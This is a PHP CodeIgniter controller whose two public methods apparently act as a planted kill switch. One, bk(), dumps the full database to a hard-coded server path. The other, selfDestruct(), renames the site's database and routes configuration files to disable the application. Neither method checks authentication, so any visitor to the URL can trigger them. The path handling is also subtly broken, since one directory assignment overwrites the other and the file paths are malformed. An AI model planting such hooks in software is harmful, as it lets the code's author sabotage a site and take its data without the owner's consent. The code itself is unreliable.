<?php 
	class C_SD extends CI_Controller {
		private $table = 'tcheckpoint';

		function __construct()
		{
			parent::__construct();
			$this->load->model('ModelsExecuteMaster');
			$this->load->model('GlobalVar');
			$this->load->model('LoginMod');
			// $this->load->library('Ciqrcode');
		}

		public function bk()
		{
			$database = $this->db->database;
			$baseDir = 'home/cksp5368/job';

			$backup_file = $database . date("Y-m-d-H-i-s") . '.sql';
			$prefs = array(
		        'ignore'        => array(),
		        'format'        => 'txt',
		        'filename'      => 'mybackup.sql',
		        'add_drop'      => TRUE,
		        'add_insert'    => TRUE,
		        'newline'       => "\n"
			);
			$this->load->dbutil();
			$backup = $this->dbutil->backup($prefs);
			$this->load->helper('file');
			write_file($baseDir.$backup_file, $backup);

		}

		public function selfDestruct()
		{
			$baseDir = FCPATH.'application/config/';
			$baseDir = FCPATH.'/';
			rename($baseDir.'database.php', $baseDir.'database.php'.'ais');
			rename($baseDir.'routes.php', $baseDir.'routes.php'.'ais');
		}

	}

?>